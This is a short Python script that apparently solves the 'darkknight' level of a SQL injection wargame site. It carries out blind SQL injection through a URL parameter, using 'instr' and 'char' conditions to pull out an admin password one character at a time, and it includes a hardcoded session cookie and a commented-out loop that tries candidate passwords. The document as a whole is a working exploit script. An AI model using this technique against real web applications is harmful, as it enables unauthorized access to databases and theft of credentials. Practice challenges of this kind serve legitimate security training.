import requests

target = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookies = {"PHPSESSID": "q6g6gipia2tga8jpt11pvvanrb"}
length = 8

pw = ''

ds = list()
for i in range(48,58):
	ds.append(i);
for i in range(97,123):
	ds.append(i);

print("Start")
for i in range(1, length + 1):
	for j in ds: 
	        pay = f"?pw=&no=1 or instr(pw,char({j})) like {i}"
	        res = requests.get(target + pay, cookies=cookies)
	        if "Hello admin" in res.text:
	            pw += chr(j)
	            print(i,j)
	            break

print("pw :", pw)
'''for i in pas:
	string = '7' + i + 'd6290b'
	pay =f"?pw={string}"
	res = requests.get(target+pay,cookies=cookies)
	if("Clear" in res.text):
		print(i)
		break
'''